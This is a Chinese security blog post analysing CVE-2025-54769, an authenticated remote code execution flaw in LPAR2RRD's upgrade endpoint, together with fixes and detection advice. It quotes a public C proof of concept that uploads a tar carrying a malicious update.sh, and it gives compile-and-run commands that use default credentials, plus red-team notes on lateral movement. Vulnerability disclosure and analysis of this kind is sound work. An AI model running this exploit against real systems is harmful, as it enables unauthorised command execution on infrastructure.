#  LPAR2RRD 升级功能 RCE 漏洞：只读用户绕过权限实现命令执行  
原创 Red Hunter
                    Red Hunter  黑白之道   2026-10-07 01:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6Ppdjey3Jd8Z0mHvpgcVmkb87XHmQbDMeMALTcQdwYwmiblGMrc0TjrgVWdg86hvljD3lzuXbMBeC5ehqs0NMYZq2Krv3MNXUQ0/640?from=appmsg "")  
> **导语**  
：DarkWebInformer 今天披露 LPAR2RRD 远程代码执行漏洞 CVE-2025-54769，CVSS 8.8。受影响版本 ≤ 8.04，8.05 已修复。攻击模型很有意思——一个**只读权限的普通用户**  
，靠 upload 一个精心构造的 tar 包到 upgrade 接口，就能让服务端解压后执行任意 shell，把命令输出写到 web 可读目录完成验证。研究员 t4hunt 同步公开了 C 语言 PoC。  
  
## 一、LPAR2RRD 是什么  
  
LPAR2RRD（Logical Partition Performance Reporting Tool）是 IBM Power Systems 的**性能监控与容量规划工具**  
，免费版就能用，企业付费版加告警和长期历史。底层用 RRDtool（轮转数据库工具）存储数据，前端是 Perl CGI。  
  
主要功能：  
- 监控 AIX / IBM i / Linux on Power / HMC（硬件管理控制台）的 CPU、内存、I/O、网络  
  
- 收集 VMware vSphere / KVM / Hyper-V 虚拟化层数据  
  
- 容量规划趋势分析  
  
- Web 界面提供监控仪表盘，默认监听 80/443  
  
运维场景：IBM Power 小机房的标配监控工具，暴露在内网或者有 VPN 限定的公网入口。默认安装路径 /home/lpar2rrd/lpar2rrd  
。  
## 二、漏洞全貌  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">字段</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">值</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE-2025-54769</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVSS</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><strong><span leaf="">8.8 High</span></strong></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">产品</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">LPAR2RRD</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">影响版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">≤ 8.04</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">≥ 8.05</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">认证要求</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">任意已登录的只读用户</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">利用接口</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">POST /lpar2rrd-cgi/upgrade.sh</span></code></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">漏洞类型</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CWE-22 路径遍历 + CWE-78 OS 命令注入（通过 update.sh）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">披露人</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">@DarkWebInformer（推特首发）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">PoC 作者</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">t4hunt（GitHub）</span></section></td></tr></tbody></table>  
![LPAR2RRD RCE 攻击示意图](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6MG9DHnx1X42ct4UDV3tRwThJ8c1lADHgPH1CHxDMbrTzQ3iaBQv9ibKWMlyNIrGiaK5GEf3g8XVVzU0OgfEV1IaibneUFYXECJECU/640?from=appmsg "LPAR2RRD RCE 攻击示意图")  
## 三、漏洞机制：upload → 解压 → 路径穿越 → RCE  
### 3.1 upgrade.sh 干了什么  
  
/lpar2rrd-cgi/upgrade.sh  
 是 LPAR2RRD 的升级 CGI 脚本。正常用途是管理员上传新版本 tar 包，脚本解压到安装目录后重启服务。  
  
核心流程：  
```
认证 (HTTP Basic) → 检查角色（只看登录不看角色）→ 接收 tar 包 → 解压到 ${INPUTDIR} → 执行 update.sh
```  
### 3.2 三个失守点  
  
**失守点 1：角色校验缺失**  
  
upgrade 接口在认证通过后**只看"是否登录"，不校验"是不是 admin"**  
。任何一个只读用户（默认 user  
/user  
）都能调用。  
  
**失守点 2：tar 解压无路径规范化**  
  
服务端用 tar -xf  
 解包时**没对 tar 内路径做规范化**  
。攻击者构造的 tar 里可以包含 ../../../etc/cron.d/...  
 之类的相对路径，把 update.sh 写到 web 目录之外的地方。  
  
**失守点 3：update.sh 无脑执行**  
  
解包后脚本会执行 scripts/update.sh  
。tar 里这个文件可以是任意 shell 脚本，被 web 服务进程的运行身份执行。  
### 3.3 完整攻击链  
```
1. 攻击者用只读账号登录（HTTP Basic）2. 构造 tar 包：   poc-cve-2025-54769/   └── scripts/       └── update.sh      ← 写 whoami 输出到 web 目录3. POST 到 /lpar2rrd-cgi/upgrade.sh4. 服务端解压 → update.sh 被执行 → 写文件到 /home/lpar2rrd/lpar2rrd/www/5. 攻击者 GET /lpar2rrd/cve_2025_54769_<nonce>.txt6. 拿到 whoami 输出 → RCE 验证完成
```  
## 四、PoC 解读：t4hunt 的 C 代码怎么跑通  
  
t4hunt 的 PoC（tunahantekeoglu/CVE-2025-54769）只有一个 C 文件 + libcurl，298 行，分四步。  
### 4.1 write_update：写恶意 update.sh  
```
static intwrite_update(const char *path, const char *nonce) {    FILE *f = fopen(path, "w");    fprintf(f,        "#!/bin/sh\n"        "set -eu\n"        "nonce=\"%s\"\n"        "target=\"${INPUTDIR:-/home/lpar2rrd/lpar2rrd}/www/cve_2025_54769_${safe_nonce}.txt\"\n"        "whoami_out=\"$(/usr/bin/whoami 2>&1)\"\n"        "{\n"        "  printf '%%s\\n' \"CVE-2025-54769 PoC: ${nonce}\"\n"        "  printf '%%s\\n' \"whoami=${whoami_out}\"\n"        "} > \"$target\"\n",        nonce);    fclose(f);    return chmod(path, 0755) == 0;}
```  
  
注意 INPUTDIR  
 这个环境变量——服务端解压脚本时通常会注入这个变量指向安装目录，作者特意 fallback 到默认路径，提高 PoC 兼容性。  
### 4.2 build_tar：打最小 tar 包  
```
snprintf(pkg, sizeof(pkg), "%s/%s", root, PACKAGE_NAME);  // PACKAGE_NAME = "poc-cve-2025-54769"snprintf(scripts, sizeof(scripts), "%s/scripts", pkg);snprintf(update, sizeof(update), "%s/update.sh", scripts);snprintf(out, out_len, "%s/%s.tar", root, PACKAGE_NAME);mkdir(pkg, 0700);mkdir(scripts, 0700);write_update(update, nonce);snprintf(cmd, sizeof(cmd), "/usr/bin/tar -cf '%s' -C '%s' '%s'", out, root, PACKAGE_NAME);system(cmd);
```  
  
在 /tmp/cve-2025-54769-XXXXXX/  
 建好目录结构，用 mkdtemp  
 拿到唯一临时目录，再 tar -cf  
 打包。  
### 4.3 post_tar：上传 tar  
```
snprintf(url, sizeof(url), "%s/lpar2rrd-cgi/upgrade.sh", base);form = curl_mime_init(curl);part = curl_mime_addpart(form);curl_mime_name(part, "upgfile");curl_mime_filedata(part, tar_path);curl_mime_filename(part, PACKAGE_NAME ".tar");curl_mime_type(part, "application/x-tar");curl_easy_setopt(curl, CURLOPT_URL, url);curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);curl_easy_setopt(curl, CURLOPT_USERPWD, auth);curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
```  
  
HTTP Basic 认证 + MIME multipart 上传，curl 走 libcurl 标准接口。  
### 4.4 get_proof：验证 RCE  
```
snprintf(url, sizeof(url), "%s/lpar2rrd/cve_2025_54769_%s.txt", base, nonce);curl_easy_perform(curl);// 然后在 response 里找 "whoami=" 字符串判断 RCE 是否成功if (proof.buf && strstr(proof.buf, "whoami=")) {    printf("[+] verified: whoami output captured\n");}
```  
  
whoami=  
 是指纹字符串——证明确实是服务端进程执行的命令，而不是缓存或者静态文件。  
### 4.5 预期输出  
```
  t4hunt  CVE-2025-54769 LPAR2RRD upgrade RCE PoC  -----------------------------------------[*] target       http://TARGET[*] nonce        t4hunt-...[*] upload_http  200[*] proof_http   200[*] proof_url    http://TARGET/lpar2rrd/cve_2025_54769_t4hunt-....txt[+] verified: whoami output captured
```  
  
PoC 的"作用域控制"也很到位——**只跑 whoami**  
，不反弹 shell、不建账号、不写持久化、不破坏文件。验证完即止，这是负责任披露该有的姿势。  
## 五、修复方案  
### 5.1 官方修复（LPAR2RRD 8.05）  
- upgrade 接口加**角色校验**  
，只允许 admin  
  
- tar 解压时用 safe_extract  
 拒绝包含 ..  
 的路径  
  
- update.sh 在受限 chroot（受限根目录）或独立 UID 下执行  
  
### 5.2 临时缓解  
- 网络层：把 LPAR2RRD Web 端口（默认 80/443）限在可信内网/VPN  
  
- 反代层：在 nginx/Apache 上加 location /lpar2rrd-cgi/upgrade.sh { deny all; }  
  
- 监控：盯 /home/lpar2rrd/lpar2rrd/www/  
 下突然冒出来的 .txt  
 文件  
  
- 凭据：所有默认账号（user/user  
、admin/admin  
）立刻改密码  
  
## 六、红队视角  
### 6.1 攻击者角度  
- **内网横移跳板**  
 — LPAR2RRD 默认装在 IBM Power 机房核心机器上，RCE 后能直接访问 HMC 接口，影响 AIX/IBM i 整个 PowerVM 拓扑  
  
- **凭据复用**  
 — LPAR2RRD 默认账号 user/user  
 在很多老机房一直没改，扫描暴露 80 端口的 LPAR2RRD 直接拿只读权限  
  
- **审计日志绕过**  
 — update.sh 在服务进程上下文执行，日志和正常升级混在一起，蓝队响应慢  
  
### 6.2 防御方角度  
- **立即升级**  
 到 8.05+  
  
- **禁用 upgrade 接口**  
（生产环境基本不需要）  
  
- **分离账号**  
 — 监控用户、admin、API 用户三类分开，只给监控用户只读，绝不共享 admin  
  
- **文件完整性监控**  
 — 在 /home/lpar2rrd/lpar2rrd/www/  
 部署 filewatch，异常 .txt 立刻告警  
  
- **网络隔离**  
 — LPAR2RRD 默认监听 0.0.0.0:80，生产应该改 listen 127.0.0.1 + 反代  
  
## 七、思考题  
1. LPAR2RRD 8.04 的修复很可能不是简单的"加 if 校验"，而是要重构 upgrade 接口（限角色 + 限路径 + chroot）。从 t4hunt 的 PoC 看，**哪一项修复能直接阻断这个 PoC？为什么？**  
  
1. CVE-2025-54769 的攻击者上传的是 .tar，**如果是 .tar.gz / .zip / .tgz**  
 会不会同样受影响？LPAR2RRD 解压不同归档格式时分别走哪条代码路径？  
  
1. 这类"upload → extract → execute"漏洞在企业产品里非常常见（CVE-2025-54769 只是冰山一角）。能想到哪些类似的设计模式陷阱？CWE 数据库里有没有专门归类？  
  
1. 假设你给客户的 LPAR2RRD 部署在公网且未修复，**用 t4hunt 这个 PoC 实际跑一遍**  
会留下什么日志痕迹？怎么在 ELK/Splunk 里写检测规则？  
  
## 八、附录：PoC 下载与使用  
### 1. 原文出处  
- Twitter 首发：https://x.com/DarkWebInformer/status/2107528087793463792  
  
- 跟帖讨论（@tuffbrownboy）：https://x.com/tuffbrownboy/status/2107528493416517712  
  
### 2. PoC 仓库  
- GitHub：https://github.com/tunahantekeoglu/CVE-2025-54769  
  
- 作者：t4hunt  
  
### 3. 编译与使用  
```
# 克隆 PoC 仓库git clone https://github.com/tunahantekeoglu/CVE-2025-54769cd CVE-2025-54769# 编译（需要 libcurl 开发包）cc -Wall -Wextra -O2 -o CVE-2025-54769 CVE-2025-54769.c -lcurl# 跑（必须是有权限的目标系统，默认账号 user/user）./CVE-2025-54769 \    -u http://TARGET \    -a user:user \    -n t4hunt-$(date +%s)
```  
### 4. 验证标志  
  
成功标志：输出 [+] verified: whoami output captured  
，且 proof URL 能下载到包含 whoami=  
 行的文本文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6NAhAic5UL0Ux3nAqtaKRylgcWPtCceibPbvFVT0aL0879s9rEFibibLqWQsv1zWHBLugn6bWR4t748oXqBygicpyKHfPFEMyYZyAMA/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
